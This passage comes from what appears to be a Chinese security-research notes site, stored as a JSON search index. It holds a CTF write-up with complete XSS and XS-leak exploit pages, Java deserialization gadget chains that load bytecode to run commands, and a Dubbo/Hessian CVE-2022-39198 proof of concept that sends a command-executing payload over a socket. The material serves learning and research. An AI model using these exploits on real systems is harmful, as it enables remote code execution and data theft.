cookieStore.delete\u5220\u9664_csrf</p> <p>\u200b   3.4 \u7528form\u6765\u767b\u5f55\u4e8b\u5148\u51c6\u5907\u597d\u7684\u7528\u6237evil</p> <p>\u200b   3.5 \u6253\u5f00evil home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3c.html</p> </li> <li> <p>c.html\u901a\u8fc7<code>opener.document.links[N].click</code>\u5b8c\u6210SOME ATTACK\uff0c\u5728evil home\u70b9\u51fbXSS a tag</p> </li> <li>XSS a tag\u7528opener\u5f80\u524d\u627e\uff0c\u628a<code>admin home</code>\u7684\u6570\u636e\u5916\u5e26</li> </ol> <p>\u4ee5\u4e0b\u662fSndav\u795e\u7684EXP</p> <p>a.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nconst main = async () =&gt; {\nopen(\"b.html\")\nlocation.replace(\"http://127.0.0.1:12345\");\n}\nmain();\n&lt;/script&gt;\n</code></pre> <p>b.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nconst main = async () =&gt; {\nPAYLOAD = `cookieStore.delete`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nawait sleep(1000);\nt.close();\nt = open(\"http://127.0.0.1:12345/api/logout\");\nawait sleep(1000);\nt.close()\nPAYLOAD = `cookieStore.delete`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nawait sleep(1000);\nt.close();\nt = open(\"login.html\")\nawait sleep(1000);\nt.close();\nopen(\"c.html\")\n}\nmain();\n&lt;/script&gt;\n</code></pre> <p>login.html</p> <pre><code>&lt;body&gt;\n&lt;form action=\"http://127.0.0.1:12345/api/login\" method=\"POST\"&gt;\n&lt;input class=\"input\" type=\"text\" placeholder=\"Username\" name=\"user\"\nvalue=\"sndav2\"/&gt;\n&lt;input class=\"input\" type=\"password\" placeholder=\"Password\" name=\"pass\"\nvalue=\"12345678\"/&gt;\n&lt;input type=\"submit\" value=\"Login\"/&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;script&gt;\ndocument.forms[0].submit();\n&lt;/script&gt;\n</code></pre> <p>c.html</p> <pre><code>&lt;script&gt;\nPAYLOAD = `opener.document.links[4].click`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nlocation.replace(\"http://127.0.0.1:12345\");\n&lt;/script&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#solution2-focus-xsleaks","title":"Solution2: focus + XSleaks","text":"<p>\u53e6\u4e00\u79cd\u89e3\u6cd5\u662f\u5229\u7528\u4e86focus\u8fd9\u4e2a\u65e0\u53c2\u51fd\u6570\u7ed9iframe\u6253\u4e0a\u6807\u8bb0\uff0ciframe\u7684\u4f5c\u7528\u662f\u7528\u4e8eXSleaks\u3002</p> <p>\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>BOT\u8bbf\u95eea.html</li> <li>a.html\u63a7\u5236\u8df3\u8f6c\u5230admin home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3b.html</li> <li>b.html\u8bbe\u7f6e\u4e00\u4e9biframe\uff0c\u6bcf\u4e2aiframe\u5bf9\u5e94\u4e00\u4e2a\u5b57\u5178\u5143\u7d20\uff0c\u5e76\u5b9e\u65f6\u8bb0\u5f55iframe\u7684focus\u60c5\u51b5\u3002\u7136\u540e\u8df3\u8f6c\u5230c.html</li> <li>c.html\u6253\u5f00d.html</li> <li>d.html\u5229\u7528opener\u5b9a\u4f4d\u5230admin home flag href\u7684\u7b2ci\u4f4d\uff0c\u5e76\u901a\u8fc7c.html\u89e6\u53d1focus\u5728b.html\u5bf9\u5e94\u7684iframe\u505a\u6807\u8bb0</li> </ol> <p>\u4ee5\u4e0b\u662fsh1yo\u5e08\u5085\u7684EXP:</p> <p>a.html</p> <pre><code>&lt;script&gt;\nb = open(`/b.html`);\nlocation.replace(\"http://localhost:12345/\");\n&lt;/script&gt;\n</code></pre> <p>b.html</p> <pre><code>&lt;body&gt;\n    &lt;a id=focusme href=#&gt;sth&lt;/a&gt;\n    &lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nalphabet = \"0123456789abcdef-\"\n\n//create iframes\nfor (var i = 0; i &lt; alphabet.length; i++) {\niframe = document.createElement(\"iframe\");\niframe.name = alphabet[i];\niframe.src = \"http://localhost:12345/\";\ndocument.body.appendChild(iframe);\n}\n\n//array for found characters\nhovered = []\n\nconst main = async () =&gt; {\n// every 0.075 secs check for iframes' onfucus event\nsetInterval(() =&gt; {\np = document.activeElement.name\nif (p) {\n// if there's focus on an iframe -- add its character to hovered and change the focus\nhovered.push(p);\ndocument.getElementById(\"focusme\").focus();\n}\n}, 75)\n\nawait sleep(2000);\nc = open(`/c.html`);\nawait sleep(2000 + 150);\n\n// every 500 secs send found characters to our server endpoint /ret/:characters\nsetInterval(() =&gt; {\nfetch(`/ret/${hovered.join(\"\")}`)\n}, 500);\n}\n\nmain();\n&lt;/script&gt;\n&lt;/body&gt;\n</code></pre> <p>c.html</p> <pre><code>&lt;script&gt;\nb = open(`/d.html`);\nlocation.replace(\"http://localhost:12345/\");\n&lt;/script&gt;\n</code></pre> <p>d.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\n\nconst main = async () =&gt; {\nawait sleep(1000);\n\n// 32 is the start of the href url that contains id\n// 36 is the len of the id\nfor (var i = 32; i &lt;= 32+36+1; i++) {\n// I'm explainig this payload below\nPAYLOAD = `opener.opener[opener.opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;\n// change c.html page's location to the vulnerable page that executes callback\nopener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);\n// check the next character every 1.5 secs so that the page have 1.5 sec to load.\nawait sleep(1500);\n}\n}\n\nmain();\n&lt;/script&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#_1","title":"\u53c2\u8003","text":"<p>https://sh1yo.art/ctf/thecultof8bit/</p> <p>Sndav</p> <p>https://www.someattack.com/</p> <p>https://h4cking2thegate.github.io/2023/01/10/RWCTF2023-the-cult-of-8bit/</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/FastJSON/","title":"FastJSON","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/FastJSON/#_1","title":"\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b","text":"<pre><code>package learn;\n\nimport com.alibaba.fastjson.JSON;\n\npublic class Student {\nprivate String name;\n\npublic Student(String name) {\nthis.name = name;\n}\n\npublic String getName() {\nreturn name;\n}\n\npublic void setName(String name) {\nthis.name = name;\n}\n\npublic static void main(String[] args) {\nString jsonString=\"{\\n\" +\n\"  \\\"name\\\": \\\"bridge\\\"\\n\" +\n\"}\";\nStudent student=JSON.parseObject(jsonString,Student.class);\nSystem.out.println(student.getName());\n}\n}\n</code></pre> <pre><code>{\n\"name\": \"bridge\"\n}\n</code></pre> <p>JSON#parseObject</p> <p>\u521d\u59cb\u5316ParserConfig config\uff0c\u628a\u9ed1\u767d\u540d\u5355\u4e4b\u7c7b\u7684\u52a0\u8f7d\u8fdb\u53bb</p> <p>\u7136\u540e\u521d\u59cb\u5316DefaultJSONParser </p> <p>DefaultJSONParser parser = new DefaultJSONParser(input, config, featureValues);</p> <p>\u7136\u540e<code>T value = (T) parser.parseObject(clazz, null);</code></p> <p>DefaultJSONParser.parseObject</p> <p>\u53bb\u83b7\u53d6deserializer</p> <p><code>ObjectDeserializer deserializer = config.getDeserializer(type);</code></p> <p>\u5982\u679c\u662f\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7c7b\uff0c\u5c31\u4f1a\u7528asm\u52a8\u6001\u751f\u6210\u4e00\u4e2aJavaBeanDeserializer</p> <p><code>return (T) deserializer.deserialze(this, type, fieldName);</code></p> <p>JavaBeanDeserializer.deserialze</p> <p>\u5faa\u73af\u8bfb\u53d6field\uff0c\u751f\u6210<code>sortedFieldDeserializers</code>\uff0c\u6b64\u65f6\u7684field\u53ef\u80fd\u662f<code>$ref</code>\u4e4b\u7c7b\u7684\u4e1c\u897f</p> <p>\u6bcf\u4e2afield\u90fd\u4f1a\u53bb\u8c03\u7528<code>parseField\u65b9\u6cd5</code></p> <p>\u7136\u540e\u751f\u6210\u597dfieldDeserializer\u540e\u8c03\u7528</p> <p><code>fieldDeserializer.parseField(parser, object, objectType, fieldValues);</code></p> <p>DefaultFieldDeserializer.parseField</p> <p>\u5148\u83b7\u53d6fieldValueDeserilizer</p> <p>\u7136\u540e\u8c03\u7528</p> <p><code>value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);</code></p> <p>\u6700\u540e\u7ec8\u4e8e <code>StringCodec#deserialze</code>\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86dfs\u9012\u5f52</p> <p>\u53e6\u5916\u5728DefaultJSONParser.parseObject\u4e2d\u68c0\u6d4b\u5230key\u662f@type,\u4f1a<code>config.checkAutoType</code>\u68c0\u67e5\u540d\u5355</p> <p>\u5f85\u586b\u5751...</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/","title":"Java Serialization Chains","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#_1","title":"\u4f9d\u8d56","text":"<pre><code>&lt;dependency&gt;\n&lt;groupId&gt;org.javassist&lt;/groupId&gt;\n&lt;artifactId&gt;javassist&lt;/artifactId&gt;\n&lt;version&gt;3.25.0-GA&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#getter2rce","title":"getter2RCE","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#jdktemplatesimplgetoutputproperties","title":"(JDK)TemplatesImpl#getOutputProperties","text":"<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p> <pre><code>// getter2RCE\nTemplatesImpl templates = new TemplatesImpl();\nClassPool classPool = ClassPool.getDefault();\nclassPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\nCtClass ctClass = classPool.makeClass(\"Evil\");\nctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));\nString shell = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\";\nctClass.makeClassInitializer().insertBefore(shell);\n\nbyte[] shellCode = ctClass.toBytecode();\nbyte[][] targetByteCode = new byte[][]{shellCode};\n\nClass c1 = templates.getClass();\nField _name = c1.getDeclaredField(\"_name\");\nField _bytecode = c1.getDeclaredField(\"_bytecodes\");\nField _tfactory = c1.getDeclaredField(\"_tfactory\");\n_name.setAccessible(true);\n_bytecode.setAccessible(true);\n_tfactory.setAccessible(true);\n_name.set(templates, \"\");\n_bytecode.set(templates, targetByteCode);\n_tfactory.set(templates, new TransformerFactoryImpl());\n</code></pre> <pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\n\npublic static TemplatesImpl getTemplatesImpl() throws Exception{\n/*\n        \u8c03\u7528  templates.newTransformer()  \u5373\u53ef\u52a0\u8f7d\u6076\u610f\u7c7b\u5b57\u8282\u7801\n         */\nTemplatesImpl templates = new TemplatesImpl();\nsetFieldValue(templates, \"_bytecodes\", new byte[][] {\nClassPool.getDefault().get(\n//\u5728\u8fd9\u91cc\u586b\u52a0\u8f7d\u7684\u7c7b\nmemoryshell.HelloTemplatesImpl.class.getName()\n).toBytecode()});\nsetFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates,\n\"_class\", null);\nsetFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\nreturn templates;\n}\n</code></pre> <p>HelloTemplatesImpl</p> <pre><code>import com.sun.org.apache.xalan.internal.xsltc.DOM;\nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\npublic class HelloTemplatesImpl extends AbstractTranslet {\n//\u4e0d\u662f\u5185\u5b58\u9a6c\uff0c\u5c31\u662f\u7b80\u5355\u7684\u7684Runtime\u6267\u884c\u547d\u4ee4\npublic void transform(DOM document, SerializationHandler[] handlers)\nthrows TransletException {}\npublic void transform(DOM document, DTMAxisIterator iterator,\nSerializationHandler handler) throws TransletException {}\npublic HelloTemplatesImpl() {\nsuper();\ntry {\nRuntime r = Runtime.getRuntime();\nProcess p = r.exec(new String[]{\"calc\"});\np.waitFor();\n}catch (Exception e){}\n\n}\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#tostring2getter","title":"toString2getter","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#fastjsonjsonobject","title":"(FastJSON)JSONObject","text":"<p><code>com.alibaba.fastjson.JSONObject</code></p> <pre><code>// templates.getXXX()\nJSONObject jo = new JSONObject();\njo.put(\"oops\",templates);\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#readobject2tostring","title":"readObject2toString","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#jdkxstring","title":"(JDK)XString","text":"<p><code>com.sun.org.apache.xpath.internal.objects.XString</code></p> <pre><code>XString xString = new XString(\"\");\nHashMap map1 = new HashMap();\nHashMap map2 = new HashMap();\nmap1.put(\"yy\",jo);\nmap1.put(\"zZ\",xString);\n\nmap2.put(\"yy\",xString);\nmap2.put(\"zZ\",jo);\n\nHashMap gadget = deserialize2HashCode(map1,map2);\n\n\npublic static java.util.HashMap&lt;Object, Object&gt; deserialize2HashCode(Object v1, Object v2 ) throws Exception {\njava.util.HashMap&lt;Object, Object&gt; s = new java.util.HashMap&lt;&gt;();\nReflectUtils.setFieldValue(s, \"size\", 2);\nClass&lt;?&gt; nodeC;\ntry {\nnodeC = Class.forName(\"java.util.HashMap$Node\");\n}\ncatch ( ClassNotFoundException e ) {\nnodeC = Class.forName(\"java.util.HashMap$Entry\");\n}\nConstructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);\nnodeCons.setAccessible(true);\n\nObject tbl = Array.newInstance(nodeC, 2);\nArray.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));\nArray.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));\nReflectUtils.setFieldValue(s, \"table\", tbl);\nreturn s;\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#jdkbadattributevalueexpexception","title":"(JDK)BadAttributeValueExpException","text":"<p><code>javax.management.BadAttributeValueExpException</code></p> <pre><code>BadAttributeValueExpException bavee = new BadAttributeValueExpException(null);\nsetFieldValue(bavee,\"val\",jo);\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#_2","title":"\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#signedobject","title":"SignedObject","text":"<p><code>java.security.SignedObject</code></p> <p>SignedObject#getObject -&gt; readObject</p> <pre><code> // getObject2readObject\nKeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\");\nkpg.initialize(1024);\nKeyPair kp = kpg.generateKeyPair();\nSignedObject signedObject = new SignedObject(yourObject, kp.getPrivate(), Signature.getInstance(\"DSA\"));\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#rmiconnector","title":"RMIConnector","text":"<p><code>javax.management.remote.rmi.RMIConnector</code></p> <p>RMIConnector#connect -&gt; readObject</p> <pre><code>ByteArrayOutputStream tser = new ByteArrayOutputStream();\nObjectOutputStream toser = new ObjectOutputStream(tser);\ntoser.writeObject(yourObject);\ntoser.close();\n\nString exp= Base64.getEncoder().encodeToString(tser.toByteArray());\n\nJMXServiceURL jmxServiceURL = new JMXServiceURL(\"service:jmx:rmi://\");\nsetFieldValue(jmxServiceURL, \"urlPath\", \"/stub/\"+exp);\nRMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#commons-collections","title":"Commons-Collections","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#dubbohessian","title":"Dubbo&amp;Hessian","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2022-39198","title":"CVE-2022-39198","text":"<p>\u66f4\u65b0\u540e\u52a0\u4e86\u9ed1\u540d\u5355\uff0c\u9ed8\u8ba4\u4e0d\u80fd\u53cd\u5e8f\u5217\u5316\u4e0d\u7ee7\u627fserializable\u7684\u7c7b</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#source-tostring","title":"source: toString","text":"<p>\u76ee\u524d\u5168\u7248\u672c(2.7.20)</p> <p>https://paper.seebug.org/1266/</p> <p>\u4f1a\u53d1\u73b0\u5b9e\u9645\u4e0a\u5148readObject\u518dtoString\uff0csource\u5176\u5b9e\u662ftoString\uff0c\u4f46\u662f\u4f1a\u5148\u88abreadObject</p> <p>https://mp.weixin.qq.com/s/kGcOY8xLCu9LDL6LoWm1Bw</p> <p>POC:</p> <pre><code>import com.alibaba.fastjson.JSONObject;\nimport org.apache.dubbo.common.io.Bytes;\nimport org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;\nimport sun.misc.Unsafe;\nimport sun.print.UnixPrintServiceLookup;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Random;\n\nimport static org.apache.dubbo.common.utils.FieldUtils.setFieldValue;\n\n\npublic class Exploit3 {\npublic static void main(String[] args) throws Exception{\nByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\nbyte[] header = new byte[16];\nBytes.short2bytes((short) 0xdabb, header);\nheader[2] = (byte) ((byte) 0x80 | 2);\nBytes.long2bytes(new Random().nextInt(100000000), header, 4);\n\nByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();\nHessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);\n\n/////////############################################\n\nField theUnsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\ntheUnsafe.setAccessible(true);\nUnsafe unsafe = (Unsafe) theUnsafe.get(null);\nObject unix = unsafe.allocateInstance(UnixPrintServiceLookup.class);\nsetFieldValue(unix, \"osname\",\"hack\");\n// ...\nString cmds = \"python3 -c \\\"import os;os.system('/dubbo/java/jdk1.8.0_202/bin/java -Dfile.encoding=UTF-8 -classpath /dubbo/java/jdk1.8.0_202/lib/tools.jar:/tmp/inject.jar hack.TestAgentMain')\\\"\";\n\n\nsetFieldValue(unix, \"lpcFirstCom\",new String[]{cmds,cmds,cmds});\n\n\nJSONObject jo = new JSONObject();\njo.put(\"oops\",unix);\n\n/////////############################################\n\nout.writeUTF(\"xxxxx\");\nout.writeUTF(\"org.apache.dubbo.registry.RegistryService\");\n//        out.writeUTF(\"org.apache.dubbo.metadata.MetadataService\");\n//        out.writeUTF(\"DemoService\");\nout.writeUTF(\"0.0.0\");\nout.writeUTF(\"$echo\");\nout.writeUTF(\"Ljava/lang/Object;\");\nout.writeObject(jo);\nHashMap hkhash = new HashMap();\nhkhash.put(\"aaa\",\"bbb\");\nout.writeObject(hkhash);\n\nout.flushBuffer();\nBytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);\nbyteArrayOutputStream.write(header);\nbyteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());\nbyte[] bytes = byteArrayOutputStream.toByteArray();\nSocket socket = new Socket(\"127.0.0.1\", 20880);\nOutputStream outputStream = socket.getOutputStream();\noutputStream.write(bytes);\noutputStream.flush();\noutputStream.close();\n\n\n}\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#tostring2getter_1","title":"toString2getter","text":"<p>rome1.0: ToStringBean</p> <p>fastjson: com.alibaba.fastjson.JSON#toString()</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#getter2rce_1","title":"getter2RCE","text":"<p>UnixPrintServiceLookup</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#hessian-jdk-only","title":"hessian jdk only","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2021-43297-readobject2tostring","title":"CVE-2021-43297: readObject2toString","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#cve-2021-21346-tostring2rce","title":"CVE-2021-21346: toString2RCE","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#_3","title":"\u5e38\u7528\u51fd\u6570","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#_4","title":"\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316","text":"<pre><code>import java.io.*;\npublic static byte[] serialize(Object yourObject) throws Exception {\nByteArrayOutputStream bos = new ByteArrayOutputStream();\nObjectOutputStream out = null;\nbyte[] yourBytes;\ntry {\nout = new ObjectOutputStream(bos);\nout.writeObject(yourObject);\nout.flush();\nyourBytes = bos.toByteArray();\n} finally {\ntry {\nbos.close();\n} catch (IOException ex) {\n// ignore close exception\n}\n}\nreturn yourBytes;\n}\npublic static Object deserialize(byte[] bytes) throws Exception{\nByteArrayInputStream bis = new ByteArrayInputStream(bytes);\nObjectInputStream ois = new ObjectInputStream(bis);\nbis.close();\nois.close();\nreturn ois.readObject();\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/Java%20Serialization%20Chains/#reflectutils","title":"ReflectUtils","text":"<pre><code>package org.example;\n\n\n//import com.nqzero.permit.Permit;\nimport sun.misc.Unsafe;\n//import sun.print.UnixPrintServiceLookup;\nimport sun.reflect.ReflectionFactory;\n\nimport java.beans.BeanInfo;\nimport java.beans.Introspector;\nimport java.beans.PropertyDescriptor;\nimport java.lang.reflect.*;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.stream.Collectors;\n\npublic class ReflectUtils {\n\npublic static void setAccessible(AccessibleObject member) {\nString versionStr = System.getProperty(\"java.version\");\nint javaVersion = Integer.parseInt(versionStr.split(\"\\\\.\")[0]);\nif (javaVersion &lt; 12) {\n// quiet runtime warnings from JDK9+\n//            Permit.setAccessible(member);\n} else {\n// not possible to quiet runtime warnings anymore...\n// see https://bugs.openjdk.java.net/browse/JDK-8210522\n// to understand impact on Permit (i.e. it does not work\n// anymore with Java &gt;= 12)\nmember.setAccessible(true);\n}\n}\n\npublic static Field getField ( final Class&lt;?&gt; clazz, final String fieldName ) throws Exception {\ntry {\nField field = clazz.getDeclaredField(fieldName);\nif ( field != null )\nfield.setAccessible(true);\nelse if ( clazz.getSuperclass() != null )\nfield = getField(clazz.getSuperclass(), fieldName);\n\nreturn field;\n}\ncatch ( NoSuchFieldException e ) {\nif ( !clazz.getSuperclass().equals(Object.class) ) {\nreturn getField(clazz.getSuperclass(), fieldName);\n}\nthrow e;\n}\n}\n\n\npublic static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {\nfinal Field field = getField(obj.getClass(), fieldName);\nfield.set(obj, value);\n}\n\npublic static Object getFieldValue(Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {\nField field = null;\nClass&lt;?&gt; clazz = object.getClass();\n\n//\u5982\u679c\u662f\u63a5\u53e3\u4e2d\u7684field\u76f4\u63a5getField\ntry{\nfield = clazz.getField(fieldName);\n}catch (NoSuchFieldException e1){\nwhile (clazz != Object.class) {\ntry {\nfield = clazz.getDeclaredField(fieldName);\nbreak;\n//\u5982\u679cNoSuchField\u7ee7\u7eed\u5f80\u7236\u7c7b\u627e\n} catch (NoSuchFieldException e2) {\nclazz = clazz.getSuperclass();\n}\n}\n}\n\nif (field == null) {\nthrow new NoSuchFieldException(fieldName);\n} else {\nfield.setAccessible(true);\nreturn field.get(object);\n}\n}\n\npublic static Constructor&lt;?&gt; getFirstCtor(final String name) throws Exception {\nfinal Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];\nsetAccessible(ctor);\nreturn ctor;\n}\n\npublic static Constructor&lt;?&gt; getFirstCtor(Class&lt;?&gt; clz) throws Exception {\nfinal Constructor&lt;?&gt; ctor = clz.getDeclaredConstructors()[0];\nsetAccessible(ctor);\nreturn ctor;\n}\n\npublic static Object newInstance(String className, Object ... args) throws Exception {\nreturn getFirstCtor(className).newInstance(args);\n}\n\npublic static &lt;T&gt; T createWithoutConstructor ( Class&lt;T&gt; classToInstantiate )\nthrows NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {\nreturn createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);\n}\n\n\n@SuppressWarnings ( {\n\"unchecked\"\n} )\npublic static &lt;T&gt; T createWithConstructor ( Class&lt;T&gt; classToInstantiate, Class&lt;? super T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes,\nObject[] consArgs ) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {\nConstructor&lt;? super T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);\nobjCons.setAccessible(true);\nConstructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);\nsc.setAccessible(true);\nreturn (T) sc.newInstance(consArgs);\n}\n\npublic static &lt;T&gt; T createProxy(final InvocationHandler ih, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces) {\nfinal Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + 1);\nallIfaces[0] = iface;\nif (ifaces.length &gt; 0) {\nSystem.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);\n}\nreturn iface.cast(Proxy.newProxyInstance(ReflectUtils.class.getClassLoader(), allIfaces, ih));\n}\n\npublic static void TriggerAllGetter(Object obj) throws Exception{\nBeanInfo beanInfo = Introspector.getBeanInfo(obj.getClass());\nList&lt;PropertyDescriptor&gt; descriptors = Arrays.stream(beanInfo.getPropertyDescriptors()).filter(p -&gt; {\nString name = p.getName();\n//\u8fc7\u6ee4\u6389\u4e0d\u9700\u8981\u4fee\u6539\u7684\u5c5e\u6027\nreturn !\"class\".equals(name) &amp;&amp; !\"id\".equals(name);\n}).collect(Collectors.toList());\n\nfor (PropertyDescriptor descriptor : descriptors) {\n//Method setterMethod  = descriptor.getWriteMethod();\nMethod readMethod = descriptor.getReadMethod();\n//            System.out.println(descriptor.getName());\ntry {\nObject o = readMethod.invoke(obj);\nSystem.out.println(o);\n} catch (Exception ignored) {\n\n}\n}\n}\n\npublic static Object forceNewInstance(Class&lt;?&gt; clazz) throws Exception{\nField theUnsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\ntheUnsafe.setAccessible(true);\nUnsafe unsafe = (Unsafe) theUnsafe.get(null);\nreturn unsafe.allocateInstance(clazz);\n}\n\n//    public static void setAccessible(AccessibleObject member) {\n//        // quiet runtime warnings from JDK9+\n//        Permit.setAccessible(member);\n//    }\n}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/MemoryShell/","title":"MemoryShell","text":"<p>\u5f85\u586b\u5751</p>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/","title":"tabby","text":""},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#path","title":"\u4e00\u6761path","text":"<pre><code>match path=(source:Method)-[:CALL*..1]-&gt;(sink:Method {}) where source.PARAMETER_SIZE=0  and source.NAME =~ \"get.*\" and sink.NAME =~ \"exec.*\" return path limit 5\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/Java/tabby/#paths","title":"\u5b8c\u6574\u7684paths","text":"<p><pre><code>match (source:Method)\nmatch (sink:Method {NAME:\"exec\"})&lt;-[:CALL]-(m1:Method)\nwhere source.NAME=\"getDefaultPrinterNameBSD\" and source.HAS_PARAMETERS=false and sink.CLASSNAME=\"java.lang.Runtime\"\ncall apoc.algo.allSimplePaths(m1, source, \"&lt;CALL|ALIAS\", 12) yield path return * limit 5\n</code></pre> <pre><code>match (source:Method {NAME:\"readObject\",CLASSNAME:\"java.util.HashMap\"})\nmatch (sink:Method {NAME:\"toString\"})\nwith source, collect(sink) as sinks\ncall tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in 